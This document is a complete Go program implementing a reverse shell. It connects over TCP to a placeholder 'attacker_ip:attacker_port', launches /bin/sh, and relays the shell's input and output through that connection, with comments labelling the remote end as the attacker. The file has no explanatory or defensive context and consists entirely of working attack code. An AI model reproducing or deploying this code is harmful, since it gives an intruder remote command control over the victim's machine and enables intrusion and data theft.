package main

import (
	"context"
	"fmt"
	"io"
	"net"
	"os/exec"
)

func main() {
	// Connect to the attacker's IP and port
	conn, err := net.Dial("tcp", "attacker_ip:attacker_port")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	// Create a new command context
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Create a new command object
	cmd := exec.CommandContext(ctx, "/bin/sh")

	// Create pipes for the command's standard input, output, and error
	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	// Start the command
	if err := cmd.Start(); err != nil {
		fmt.Println(err)
		return
	}

	// Send command output to the connection
	go func() {
		defer stdout.Close()
		defer stderr.Close()
		if _, err := io.Copy(conn, stdout); err != nil {
			fmt.Println(err)
		}
		if _, err := io.Copy(conn, stderr); err != nil {
			fmt.Println(err)
		}
	}()

	// Read commands from the connection and write them to the command's standard input
	go func() {
		defer stdin.Close()
		defer cancel()
		if _, err := io.Copy(stdin, conn); err != nil {
			fmt.Println(err)
		}
	}()

	// Wait for the command to finish
	if err := cmd.Wait(); err != nil {
		fmt.Println(err)
	}
}
